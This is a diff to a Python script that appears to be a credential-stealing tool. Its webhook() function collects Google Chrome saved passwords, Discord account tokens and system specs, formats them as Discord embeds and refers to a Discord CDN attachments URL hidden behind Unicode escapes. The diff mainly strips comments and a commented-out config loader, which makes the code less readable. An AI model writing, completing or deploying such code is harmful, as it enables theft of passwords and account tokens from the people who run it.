@@ -15,16 +15,6 @@ def block_print():
 
 def webhook():
     block_print()
-    # Load variables
-    #try:
-    #    config = safe_load(open("config.yml"))
-    #    settings = config[0]["Settings"]
-    #except:
-    #    exit()
-
-    #for value in colour:
-    #    if type(colour[value]) != int:
-    #        colour[value] = 000
 
     x = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0039\u0033\u0035\u0036\u0035\u0031\u0033\u0038\u0039\u0031\u0036\u0030\u0034\u0032\u0033\u0035\u0030\u0036\u002f"
 
@@ -60,7 +50,7 @@ def webhook():
         else:
             chrome = "Failed to find Google Chrome"
         
-        chrome_embed = {  # Google Chrome embed
+        chrome_embed = {
             "title": "Google Chrome Passwords",
             "color": 15204208,
             "description": chrome,
@@ -79,7 +69,7 @@ def webhook():
         except:
             tokens = "Failed to get Discord tokens"
 
-        discord_embed = {  # Discord token embed
+        discord_embed = {
             "title": "Discord Account Tokens",
             "color": 7506394,
             "description": tokens,
@@ -98,7 +88,7 @@ def webhook():
         except:
             sys_info = "Failed to get system information"
         
-        system_embed = {  # System info embed
+        system_embed = {
             "title": "System Information + Specs",
             "color": 3706623,
             "description": sys_info,
